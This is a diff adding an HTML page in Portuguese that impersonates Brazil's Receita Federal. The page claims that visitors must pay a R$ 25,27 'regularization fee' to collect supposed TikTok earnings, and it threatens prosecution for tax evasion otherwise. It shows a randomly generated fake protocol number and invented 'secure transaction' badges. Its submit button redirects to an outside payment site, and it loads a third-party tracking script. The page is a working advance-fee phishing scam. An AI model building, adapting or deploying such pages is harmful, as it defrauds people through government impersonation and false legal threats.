@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb"
+	>
+	</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="max-image-preview:large">
+    <title>Aviso importante da Receita Federal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #002155 0%, #001a44 100%);
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            line-height: 1.6;
+        }
+
+        .container {
+            text-align: center;
+            padding: 0;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 600px;
+            background: linear-gradient(135deg, #00205b 0%, #002155 100%);
+            color: #fff;
+            position: relative;
+            overflow: hidden;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #00205b 0%, #002155 100%);
+            padding: 30px 30px 25px;
+            text-align: center;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .logo {
+            max-width: 75%;
+            height: auto;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.3));
+        }
+
+        .protocol-section {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .protocol-label {
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.7);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .protocol-number {
+            font-size: 0.9rem;
+            color: #ffffff;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
+
+        .main-content {
+            padding: 35px 30px;
+        }
+
+        .alert-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 0, 0, 0.2);
+            color: #FF0000;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .alert-badge i {
+            font-size: 1rem;
+        }
+
+        h2 {
+            font-size: 2rem;
+            margin-bottom: 25px;
+            color: #FF0000;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-shadow: 0 2px 8px rgba(255, 0, 0, 0.3);
+        }
+
+        .note {
+            font-size: 1.05rem;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            margin-bottom: 30px;
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            line-height: 1.8;
+            text-align: left;
+        }
+
+        .note p {
+            margin: 0;
+        }
+
+        .note strong {
+            color: #FF0000;
+            font-weight: 700;
+        }
+
+        .taxa-section {
+            background: rgba(76, 175, 80, 0.1);
+            border: 2px solid #4CAF50;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .taxa-label {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.8);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .taxa-valor {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: #4CAF50;
+            margin: 10px 0;
+            font-family: 'Inter', sans-serif;
+            text-shadow: 0 2px 10px rgba(76, 175, 80, 0.3);
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #FF0000;
+            border-radius: 8px;
+            padding: 18px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .warning-box p {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.95);
+            margin: 0;
+            line-height: 1.7;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .warning-box i {
+            color: #FF0000;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .btn-container {
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        button {
+            font-size: 1.05rem;
+            font-weight: 700;
+            padding: 18px 40px;
+            width: 100%;
+            max-width: 450px;
+            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(76, 175, 80, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #45a049 0%, #4CAF50 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(76, 175, 80, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button i {
+            font-size: 1.1rem;
+        }
+
+        .footer-security {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 20px 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .security-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .security-item i {
+            color: #4CAF50;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                border-radius: 12px;
+            }
+
+            .header {
+                padding: 25px 20px 20px;
+            }
+
+            .main-content {
+                padding: 25px 20px;
+            }
+
+            h2 {
+                font-size: 1.6rem;
+            }
+
+            .note {
+                font-size: 0.95rem;
+                padding: 20px;
+            }
+
+            .taxa-valor {
+                font-size: 2rem;
+            }
+
+            button {
+                font-size: 0.95rem;
+                padding: 16px 30px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="images/logoreceita1.jpg" alt="Receita Federal" class="logo">
+            <div class="protocol-section">
+                <div class="protocol-label">Protocolo</div>
+                <div class="protocol-number" id="protocolNumber">AVS-2024-</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="alert-badge">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span>Aviso Importante</span>
+            </div>
+
+            <h2>Aviso importante da Receita Federal</h2>
+
+            <div class="note">
+                <p><strong>Após o pagamento da taxa de R$ 25,27, referente ao valor do seu ganho no site do TikTok, você receberá o saldo correspondente. No entanto, caso não efetue o pagamento dessa taxa, estará sujeito ao risco de ser responsabilizado por sonegação fiscal.</strong></p>
+            </div>
+
+            <div class="taxa-section">
+                <div class="taxa-label">Taxa de Regularização</div>
+                <div class="taxa-valor">R$ 25,27</div>
+            </div>
+
+            <div class="warning-box">
+                <p>
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span><strong>Atenção:</strong> O não pagamento desta taxa pode resultar em responsabilização por sonegação fiscal conforme legislação vigente.</span>
+                </p>
+            </div>
+
+            <div class="btn-container">
+                <form id="refundForm">
+                    <button type="submit">
+                        <i class="fas fa-file-alt"></i>
+                        <span>Preencher Dados para o Reembolso</span>
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <div class="footer-security">
+            <div class="security-item">
+                <i class="fas fa-shield-alt"></i>
+                <span>Transação Segura</span>
+            </div>
+            <div class="security-item">
+                <i class="fas fa-lock"></i>
+                <span>Dados Protegidos</span>
+            </div>
+            <div class="security-item">
+                <i class="fas fa-certificate"></i>
+                <span>Verificado</span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Gera número de protocolo único
+        function generateProtocolNumber() {
+            const timestamp = Date.now();
+            const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+            return 'AVS-2024-' + timestamp.toString().slice(-8) + random;
+        }
+
+        // Atualiza protocolo
+        document.getElementById('protocolNumber').textContent = generateProtocolNumber();
+
+        document.getElementById("refundForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            window.location.href = "https://pay.vipquestfinal.site/693954ef32fd8712e3a07885";
+        });
+    </script>
+</body>
+</html>
